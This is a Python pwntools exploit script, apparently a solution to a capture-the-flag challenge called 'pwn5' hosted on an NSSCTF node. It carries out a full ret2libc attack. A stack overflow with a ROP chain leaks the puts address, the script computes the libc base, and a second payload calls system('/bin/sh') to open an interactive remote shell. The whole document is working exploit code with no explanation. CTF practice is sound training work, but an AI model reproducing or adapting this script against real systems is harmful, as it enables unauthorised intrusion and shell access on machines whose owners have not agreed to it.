from pwn import *

# io = process("./pwn5")
io = remote("node4.anna.nssctf.cn", 22730)
elf = ELF("./pwn5")
libc = ELF("./libc6_2.27-0ubuntu2_amd64.so")
# gdb.attach(io)
context(os="linux", arch="amd64")

call_rbp = 0x400635  # call qword ptr [rbp + 0x48] （没蛋用）
ret = 0x4004C9
rdi_ret = 0x400713
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.sym["main"]
io.recvuntil(b"name")
io.send(b"yours")

payload = (
    cyclic(0x20 + 0x8)
    + p64(ret)
    + p64(rdi_ret)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(main)
)
io.recvuntil(b"say to me?")
io.sendline(payload)
io.recvuntil(b"\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
print("puts address =", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base address =", hex(libc_base))
system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
payload = cyclic(0x20 + 0x8) + p64(rdi_ret) + p64(binsh) + p64(system)

io.recvuntil(b"name")
io.send(b"yours")
io.recvuntil(b"say to me?")
io.sendline(payload)


io.interactive()
